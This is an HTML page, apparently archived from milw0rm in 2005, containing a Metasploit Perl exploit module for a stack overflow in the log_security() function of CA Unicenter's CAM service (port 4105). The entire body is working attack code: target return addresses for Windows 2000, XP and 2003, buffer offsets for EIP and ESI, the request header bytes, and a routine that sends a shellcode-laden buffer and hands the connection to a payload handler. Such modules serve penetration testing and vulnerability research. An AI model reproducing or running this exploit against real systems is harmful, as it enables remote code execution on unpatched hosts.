<html>
<head>
<title>CA Unicenter 3.1 CAM log_security() Stack Overflow Exploit (meta)</title>
<pre>
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::cacam_logsecurity_win32;
use base &quot;Msf::Exploit&quot;;
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'     =&gt; 'CA CAM log_security() Stack Overflow (Win32)',
	'Version'  =&gt; '$Revision: 1.1 $',
	'Authors'  =&gt; [ 'H D Moore &lt;hdm [at] metasploit.com&gt;' ],
	'Arch'     =&gt; [ 'x86' ],
	'OS'       =&gt; [ 'win32', 'winnt', 'win2000', 'winxp', 'win2003'],
	'Priv'     =&gt; 1,
	'AutoOpts' =&gt; { 'EXITFUNC' =&gt; 'process' },

	'UserOpts' =&gt;
	  {
		'RHOST' =&gt; [1, 'ADDR', 'The target address'],
		'RPORT' =&gt; [1, 'PORT', 'The target port', 4105],
	  },

	'Payload' =&gt;
	  {
		'Space'     =&gt; 1024,
		'BadChars'  =&gt; &quot;\x00&quot;,
		'Prepend'   =&gt; &quot;\x81\xc4\x54\xf2\xff\xff&quot;,	# add esp, -3500
		'Keys'		=&gt; ['+ws2ord'],
	  },

	'Description'  =&gt; Pex::Text::Freeform(qq{
		This module exploits a vulnerability in the CA CAM service by passing
		a long parameter to the log_security() function. The CAM service is part
		of TNG Unicenter. This module has been tested on Unicenter v3.1.
}),

	'Refs'    =&gt;
	  [
	
	  ],

	'DefaultTarget' =&gt; 0,
	'Targets' =&gt;
	  [	  
	  	# W2API.DLL @ 0x01950000 - return to ESI
		# $Header: /home/mscvs/framework/exploits/cacam_logsecurity_win32.pm,v 1.1 2005/10/15 14:13:50 hdm Exp $
		['W2API.DLL TNG 2.3', 0x01951107], 
		
		# return to ESI in ws2help.dll
		['Windows 2000 SP0-SP4 English', 0x750217ae],
		['Windows XP SP0-SP1 English',   0x71aa16e5],
		['Windows XP SP2 English',       0x71aa1b22],
		['Windows 2003 SP0 English',     0x71bf175f],
	  ],

	'Keys'    =&gt; ['cam'],
  };

sub new {
	my $class = shift;
	my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self-&gt;GetVar('RHOST');
	my $target_port = $self-&gt;GetVar('RPORT');
	my $target_idx  = $self-&gt;GetVar('TARGET');
	my $shellcode   = $self-&gt;GetVar('EncodedPayload')-&gt;Payload;
	my $target = $self-&gt;Targets-&gt;[$target_idx];

	$self-&gt;PrintLine(&quot;[*] Attempting to exploit target &quot; . $target-&gt;[0]);


	my $s = Msf::Socket::Tcp-&gt;new
	  (
		'PeerAddr'  =&gt; $target_host,
		'PeerPort'  =&gt; $target_port,
	  );

	if ($s-&gt;IsError) {
		$self-&gt;PrintLine('[*] Error creating socket: ' . $s-&gt;GetError);
		return;
	}

	my $pattern = Pex::Text::EnglishText(4096);

	# Offset 1016 for EIP, 1024 = ESP, 1052 = ESI
	substr($pattern, 1016, 4, pack('V', $target-&gt;[1]));
	substr($pattern, 1052, length($shellcode), $shellcode);

	my $req =
		&quot;\xfa\xf9\x00\x10&quot; . $pattern . &quot;\x00&quot;;

	my $ack = $s-&gt;Recv(4, 5);
	if ($ack ne &quot;ACK\x00&quot;) {
		$self-&gt;PrintLine(&quot;[*] The CAM service is not responding.&quot;);
		return;
	}
	$s-&gt;Send($req);
	$s-&gt;Recv(-1,1);
	$self-&gt;Handler($s);
	$s-&gt;Close();

	return;
}

1;

# milw0rm.com [2005-10-19]
</pre>
</html>

